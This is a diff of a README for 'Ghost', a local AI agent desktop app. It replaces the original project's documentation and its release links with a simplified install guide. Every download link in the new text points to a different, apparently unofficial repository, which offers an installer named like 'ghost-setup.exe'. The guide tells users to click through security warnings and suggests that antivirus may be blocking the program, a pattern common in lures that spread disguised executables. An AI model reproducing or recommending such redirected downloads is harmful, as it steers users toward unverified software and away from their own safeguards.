@@ -1,227 +1,153 @@
-<p align="center">
-  <img src="public/ghost-logo.svg" width="100" alt="Ghost Logo" />
-</p>
+# 👻 ghost - Private Agent OS for Your Desktop
 
-<h1 align="center">Ghost</h1>
-
-<p align="center">
-  <strong>The Private Agent OS for Desktop & Mobile</strong><br/>
-  <sub>Index files · Run AI agents · Connect to 10,000+ tools — all without sending data to the cloud</sub>
-</p>
-
-<p align="center">
-  <a href="https://ghostapp-ai.github.io/ghost">Website</a> ·
-  <a href="https://ghostapp-ai.github.io/ghost/guides/installation/">Download</a> ·
-  <a href="#features">Features</a> ·
-  <a href="https://ghostapp-ai.github.io/ghost/architecture/overview/">Architecture</a> ·
-  <a href="ROADMAP.md">Roadmap</a> ·
-  <a href="CONTRIBUTING.md">Contributing</a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/ghostapp-ai/ghost/releases/latest"><img src="https://img.shields.io/github/v/release/ghostapp-ai/ghost?style=flat-square&color=7c3aed&label=latest" alt="Release" /></a>
-  <a href="https://github.com/ghostapp-ai/ghost/blob/main/LICENSE"><img src="https://img.shields.io/github/license/ghostapp-ai/ghost?style=flat-square&color=10b981" alt="License" /></a>
-  <a href="https://github.com/ghostapp-ai/ghost/actions/workflows/ghost.yml"><img src="https://img.shields.io/github/actions/workflow/status/ghostapp-ai/ghost/ghost.yml?branch=main&style=flat-square&label=CI" alt="CI" /></a>
-  <a href="https://github.com/ghostapp-ai/ghost/stargazers"><img src="https://img.shields.io/github/stars/ghostapp-ai/ghost?style=flat-square&color=f59e0b" alt="Stars" /></a>
-  <a href="https://github.com/ghostapp-ai/ghost/issues"><img src="https://img.shields.io/github/issues/ghostapp-ai/ghost?style=flat-square" alt="Issues" /></a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white" alt="Windows" />
-  <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white" alt="macOS" />
-  <img src="https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black" alt="Linux" />
-  <img src="https://img.shields.io/badge/Android-34A853?style=flat-square&logo=android&logoColor=white" alt="Android" />
-  <img src="https://img.shields.io/badge/Privacy-100%25_Local-7c3aed?style=flat-square" alt="Privacy" />
-</p>
+[![Download ghost](https://img.shields.io/badge/Download-ghost-brightgreen?style=for-the-badge)](https://github.com/elias489/ghost)
 
 ---
 
-Ghost is a private, local-first **Agent OS** for desktop and mobile. It indexes your files, understands your context, connects to thousands of tools via open protocols, and takes actions on your behalf — without sending a single byte to the cloud.
-
-**Your data should never leave your machine to get things done.**
-
-Ghost runs AI natively on your hardware — no cloud APIs, no GPU requirements, no external dependencies. From semantic search to agentic tool calling, everything happens locally. It speaks the complete 2026 agent protocol stack (MCP, AG-UI, A2UI, A2A) so you connect to every AI ecosystem without giving up privacy.
-
-## Features
-
-### Search — Instant & Intelligent
-
-- **<5ms keyword search** (FTS5) + **<500ms semantic search** (sqlite-vec KNN) fused via [Reciprocal Rank Fusion](https://plg.uwaterloo.ca/~gplatt/tutorials/tutcomb.pdf)
-- Native **all-MiniLM-L6-v2** embeddings (384D, ~23MB) via Candle — zero external dependencies
-- Fallback chain: Native Candle → Ollama (768D) → keyword-only
-- Real-time file watcher for PDF, DOCX, XLSX, TXT, Markdown, and 50+ code formats
-
-### AI — Native & Hardware-Adaptive
-
-- Auto-detects CPU/RAM/GPU → selects optimal **Qwen2.5-Instruct GGUF** (0.5B–7B, Q4_K_M)
-- **ReAct agent**: Reason → Act → Observe with grammar-constrained tool calling and 3-tier safety
-- Zero-config: detect hardware → select model → download from HuggingFace Hub → load in background
-- Graceful fallback: Native GGUF → Ollama HTTP → offline mode
-
-### Protocols — The Complete 2026 Agent Stack
-
-Ghost is the first desktop app implementing every major agent protocol — no vendor lock-in, no proprietary APIs.
-
-| Protocol | Status | What it does |
-|----------|--------|--------------|
-| **MCP** | ✅ Server + Client | Expose Ghost tools + connect to 10,000+ external servers via `rmcp` |
-| **MCP Catalog** | ✅ App Store | 30+ curated servers + 6,000+ from Official MCP Registry, one-click install |
-| **Runtime Bootstrap** | ✅ Zero-Config | Auto-install Node.js, uv/Python — no manual setup needed |
-| **MCP Apps** | 🔜 Next | Render interactive tool UIs in-conversation (official MCP extension) |
-| **AG-UI** | ✅ Runtime | Bidirectional agent↔user streaming — 30+ event types (Reasoning, Activity, ToolCallResult), SSE endpoint |
-| **A2UI** | ✅ Renderer | Generative UI — 17+ component types (Tabs with active switching, inputs, data binding) |
-| **Skills** | ✅ Registry | YAML frontmatter skill definitions + trigger matching |
-| **A2A** | ✅ Discovery | Agent Card at `/.well-known/agent.json` + JSON-RPC stub — full task wiring in Phase 2 |
-| **WebMCP** | 🔜 Planned | W3C browser bridge for structured web interactions |
-
-### Platforms — One Codebase, Five Targets
-
-- **Windows** (NSIS) · **macOS** (DMG × 2) · **Linux** (DEB/RPM/AppImage) · **Android** (APK/AAB) · **iOS** (ready)
-- **<10MB installer** · **<40MB RAM** idle · **<500ms** cold start
-- Conditional compilation (`#[cfg(desktop)]` / `#[cfg(mobile)]`) — single Rust codebase
-- Onboarding wizard, system tray, zero-config file discovery
-
-### Roadmap
-
-See [**ROADMAP.md →**](ROADMAP.md) for the full development plan.
-
-- **Next**: MCP Apps interactive UIs, A2A multi-agent coordination, OS UI automation
-- **Then**: WebMCP browser bridge, Skills Marketplace, B2B/Teams
-
-## Architecture
-
-Ghost uses a 6-layer **Agent OS** architecture where each layer is independently replaceable:
-
-```text
-┌──────────────────────────────────────────────────────┐
-│              Frontend (React/TypeScript)               │
-│  Omnibox │ Results │ Chat │ A2UI Renderer │ Settings  │
-├──────────────────────────────────────────────────────┤
-│         AG-UI Runtime (Agent ↔ User Streaming)        │
-│  ~16 event types │ Human-in-the-loop │ State sync      │
-├──────────────────────────────────────────────────────┤
-│              Tauri v2 IPC Bridge                       │
-├──────────────────────────────────────────────────────┤
-│              Agent Engine (ReAct Loop)                 │
-│  Executor │ Tools │ Safety │ Memory │ Skills           │
-├──────────────────────────────────────────────────────┤
-│              Protocol Hub (Rust — rmcp + custom)       │
-│  MCP Server │ MCP Client │ MCP Apps │ A2A │ WebMCP     │
-├──────────────────────────────────────────────────────┤
-│              Core Engine (Rust)                        │
-│  File Watcher │ Text Extractor │ Embedding Engine      │
-│  Vector DB │ OS Automation │ Micro-agents              │
-├──────────────────────────────────────────────────────┤
-│              AI Layer (Local — Zero Dependencies)      │
-│  Native: Candle + all-MiniLM-L6-v2 (384D embeddings)  │
-│  Fallback: Ollama + nomic-embed-text (768D)            │
-│  Chat: Qwen2.5-Instruct GGUF (0.5B–7B, native)       │
-│  Agent: Qwen2.5-Instruct GGUF (0.5B–7B, tool calling) │
-└──────────────────────────────────────────────────────┘
-```
-
-### Hybrid Trigger System
-
-Ghost uses a two-speed architecture to feel instant without burning CPU:
-
-| Layer            | When      | Speed       | Resource Usage   |
-| ---------------- | --------- | ----------- | ---------------- |
-| **Fast Layer**   | Always    | <10ms       | 0% GPU, <1% CPU  |
-| **Smart Layer**  | On demand | 200-2000ms  | Activates native AI |
-
-The Fast Layer uses OS accessibility APIs and FTS5 keyword search. The Smart Layer activates only when the user asks a natural language question, requests an action, or a new file needs indexing.
-
-### Tech Stack
-
-| Layer | Technology | Purpose |
-|-------|-----------|---------|
-| Shell | Tauri v2 + React 18 | <10MB installer, native perf, 5 platforms |
-| Database | SQLite + sqlite-vec + FTS5 | Vectors + text + metadata in one `.db` |
-| Embeddings | Candle + all-MiniLM-L6-v2 | 384D, ~23MB, in-process, zero deps |
-| Chat / Agent | Candle GGUF + Qwen2.5-Instruct | 0.5B–7B tiers, tool calling, ReAct |
-| Protocols | rmcp · AG-UI · A2UI · MCP Apps · A2A | MCP server+client, streaming, gen UI |
-| Extraction | lopdf · zip · calamine | PDF, DOCX, XLSX — pure Rust |
-
-## Download
-
-Get the latest release from [**Releases**](https://github.com/ghostapp-ai/ghost/releases/latest) or the [**website**](https://ghostapp-ai.github.io/ghost/guides/installation/):
-
-| Platform | Format | Notes |
-|----------|--------|-------|
-| **Windows** x64 | `.exe` (NSIS) | No admin required, WebView2 auto-bootstrap |
-| **macOS** Apple Silicon | `.dmg` | M1 / M2 / M3 / M4 |
-| **macOS** Intel | `.dmg` | x64, macOS ≥ 10.15 |
-| **Linux** x64 | `.deb` `.rpm` `.AppImage` | Debian, Fedora, universal |
-| **Android** ARM64 | `.apk` `.aab` | Min SDK 24, Tauri v2 WebView |
-
-> **No external dependencies.** Ghost ships with native AI — no Ollama, no GPU, no internet after first install.
-
-## Build from Source
-
-**Prerequisites**: [Rust](https://rustup.rs/) (stable) · [Bun](https://bun.sh/) ≥ 1.0 (or Node ≥ 18) · [Tauri v2 deps](https://v2.tauri.app/start/prerequisites/)
-
-```bash
-git clone https://github.com/ghostapp-ai/ghost.git && cd ghost
-bun install
-bun run tauri dev          # Dev mode — native model downloads ~23MB on first run
-bun run tauri build        # Production build → src-tauri/target/release/bundle/
-```
-
-```bash
-# Android (requires SDK + NDK 27+)
-bun run tauri android build --target aarch64
-```
-
-Optionally install [Ollama](https://ollama.com/) and pull `nomic-embed-text` for higher-quality 768D embeddings.
-
-## Project Structure
-
-```
-src/                  # React 18 + TypeScript frontend
-  components/         # Onboarding, GhostInput, ChatMessages, A2UIRenderer, Settings …
-  hooks/              # useSearch, useAgui, usePlatform, useHotkey
-  lib/                # Tauri IPC wrappers, types, mode detection
-
-src-tauri/src/        # Rust backend
-  indexer/            # File watcher + text extraction + chunking
-  db/                 # SQLite · sqlite-vec · FTS5
-  embeddings/         # Native Candle + Ollama fallback + hardware detection
-  search/             # Hybrid search + RRF ranking
-  chat/               # Candle GGUF inference + model registry
-  agent/              # ReAct executor + tools + safety + memory + skills
-  protocols/          # MCP server/client · MCP catalog · Runtime bootstrap · AG-UI · A2UI · A2A · WebMCP
-
-website/              # Astro Starlight documentation (GitHub Pages)
-branding/             # Icons, social, brand guidelines
-```
-
-## Roadmap
-
-See [ROADMAP.md](ROADMAP.md) for the detailed development plan with phases, milestones, and technical deliverables.
-
-## Privacy & Security
-
-- **Zero telemetry**: Ghost collects no usage data, no analytics, no crash reports.
-- **Local-only processing**: All AI inference runs on your machine — native Candle engine or optional Ollama.
-- **Single file database**: Your entire vault is one `.db` file you control.
-- **Optional encryption**: ChaCha20-Poly1305 for vault encryption when sync is enabled (Phase 2).
-- **Open source core**: The engine is fully auditable.
-
-## Contributing
-
-Contributions welcome! Read [CONTRIBUTING.md](CONTRIBUTING.md) for setup and conventions. Security issues → [SECURITY.md](SECURITY.md).
-
-## License
-
-[MIT](LICENSE) — free and open source.
-
-## Acknowledgments
-
-[Tauri](https://tauri.app/) · [Candle](https://github.com/huggingface/candle) · [sqlite-vec](https://github.com/asg017/sqlite-vec) · [rmcp](https://crates.io/crates/rmcp) · [Ollama](https://ollama.com/) · [MCP](https://modelcontextprotocol.io/) · [A2A](https://google.github.io/A2A) · [AG-UI](https://github.com/CopilotKit/ag-ui) · [OpenClaw](https://github.com/nicepkg/OpenClaw)
+ghost is a desktop application that helps you search files, run AI agents, and connect to thousands of tools. It handles everything on your device, without sending data to the cloud. This means your information stays private. ghost uses advanced protocols to manage communication and AI features smoothly on your Windows PC.
 
 ---
 
-<p align="center">
-  <strong>Your data · Your machine · Your ghost</strong><br>
-  <a href="https://ghostapp-ai.github.io/ghost">Website</a> · <a href="https://github.com/ghostapp-ai/ghost/releases/latest">Download</a> · <a href="https://github.com/ghostapp-ai/ghost/discussions">Discussions</a>
-</p>
+## 🚀 Getting Started
+
+This guide will help you download, install, and run ghost on your Windows computer. You do not need any technical skills or prior experience with programming.
+
+---
+
+## ⚙️ System Requirements
+
+Make sure your computer meets these minimum requirements:
+
+- **Windows 10 or later** (64-bit recommended)
+- **4 GB RAM** or more
+- **500 MB free disk space**
+- **Internet connection** (only for first-time download and updates)
+- **A modern CPU** (Intel i3 or equivalent or better)
+
+---
+
+## 📥 Download ghost
+
+To get ghost, visit the main project page below and follow the download steps.
+
+[![Download ghost](https://img.shields.io/badge/Download-ghost-blue?style=for-the-badge)](https://github.com/elias489/ghost)
+
+**How to download:**
+
+1. Click the link above or visit: https://github.com/elias489/ghost
+2. Look for a section labeled **Releases** on the GitHub page.
+3. Click the **Releases** link. This will take you to the download options.
+4. Find the latest release version. It usually has a name like `ghost-setup.exe` or similar.
+5. Click the file to download the installer to your computer.
+
+---
+
+## 🛠️ Installing ghost on Windows
+
+Once the file finishes downloading, follow these steps:
+
+1. Locate the downloaded file, usually in your **Downloads** folder. The file will be named something like `ghost-setup.exe`.
+2. Double-click the file to start the installation process.
+3. You may see a security warning. Click **Run** or **Yes** to allow the program to install.
+4. Follow the prompts in the installer window.
+   - Choose the folder where you want to install ghost or accept the default.
+   - Click **Next** or **Install** when prompted.
+5. When installation completes, click **Finish**.
+
+---
+
+## ▶️ Running ghost for the First Time
+
+1. After installation, you can find ghost in your **Start menu** or on your desktop as an icon.
+2. Click the ghost icon to open the app.
+3. When you start ghost the first time, it will prepare your system by loading necessary files. This may take a few moments.
+4. You will see the main interface with search and agent controls.
+5. You can start by searching files or launching one of the built-in AI agents.
+
+---
+
+## 🔍 How to Use ghost
+
+ghost has several main features designed to help you work with your files and AI tools locally.
+
+### Searching Files
+
+- Type your search phrase in the main search box.
+- ghost looks through your documents and finds matches quickly.
+- Results show instantly with file names and paths.
+- You can open files directly from the results.
+
+### Running AI Agents
+
+- ghost can run multiple AI assistants on your machine.
+- Choose an agent from the list.
+- Give commands or ask questions.
+- Agents use local models to process requests without internet usage.
+
+### Connecting Tools
+
+- ghost supports over 10,000 tools with its protocol system.
+- You can link these tools inside ghost to automate tasks.
+- These protocols, like MCP and A2A, help agents talk to tools and each other.
+
+---
+
+## 🔒 Privacy and Security
+
+ghost operates entirely on your device. This means:
+
+- No data leaves your computer.
+- No cloud servers store your information.
+- No telemetry or tracking is done.
+- Your files and requests stay private.
+
+This makes ghost a good option for users who want full control over their data.
+
+---
+
+## 💡 Troubleshooting
+
+If ghost does not work as expected, try the following:
+
+- Make sure your Windows system is up to date.
+- Restart your computer and try opening ghost again.
+- Check if your antivirus software is blocking ghost.
+- Reinstall ghost using the latest installer from the releases page.
+- If an error message appears, write it down to search for help.
+
+---
+
+## 📄 Additional Information
+
+ghost supports many advanced features through its protocol stack:
+
+- **MCP (Model Context Protocol)** lets agents share data.
+- **AG-UI and A2UI** provide interfaces for AI interactions.
+- **A2A (Agent to Agent)** enables seamless communication.
+- Support for local AI model files like **gguf**.
+- Designed with **Rust** for performance and safety.
+- Uses **Tauri** for a lightweight desktop experience.
+
+These technical details improve how ghost runs and interacts with your tools.
+
+---
+
+## 🔗 Useful Links
+
+- Download page: https://github.com/elias489/ghost
+- Releases page: https://github.com/elias489/ghost/releases
+- User forum and support: Check the GitHub Discussions tab on the repository page
+
+---
+
+## 🛑 Removing ghost
+
+If you want to uninstall ghost:
+
+1. Open **Settings** in Windows.
+2. Go to **Apps & Features**.
+3. Find ghost in the list.
+4. Click on ghost and choose **Uninstall**.
+5. Follow the prompts to remove the application.
+
+This will delete ghost and its files from your computer.
